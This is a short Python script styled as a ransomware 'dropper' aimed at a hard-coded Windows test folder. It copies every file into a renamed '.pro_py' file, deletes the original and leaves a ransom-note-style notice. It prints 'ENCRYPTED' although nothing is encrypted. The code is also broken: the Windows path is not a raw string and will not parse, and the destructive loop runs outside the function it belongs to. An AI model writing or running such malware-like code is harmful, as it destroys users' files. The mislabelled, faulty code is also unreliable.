#!/usr/bin/env python3
import os, time, pathlib
def dropper(): print("⚠️  PYTHON DROPPER ACTIVATED ⚠️")
target = pathlib.Path("C:\Users\Kanhaiya\System And Security\data\test_files") 
if target.exists():
 count = 0
 for f in target.rglob("*"):
  if f.is_file() and not f.name.endswith(".pro_py") and "NOTICE" not in f.name:
   try:
    data = f.read_bytes()
    new_name = str(f) + ".pro_py"
    with open(new_name, 'wb') as nf:
     nf.write(b"# PROFESSIONAL PYTHON DROPPER\n")
     nf.write(data)
    f.unlink()
    count += 1
    print(f"[ENCRYPTED] {f.name}")
   except: pass
 with open(target / "PRO_PYTHON_NOTICE.txt", 'w') as n:
  n.write(f"PROFESSIONAL PYTHON DROPPER\nProcessed {count} files")
 print(f"[COMPLETE] Encrypted {count} files")
if __name__ == "__main__": dropper()
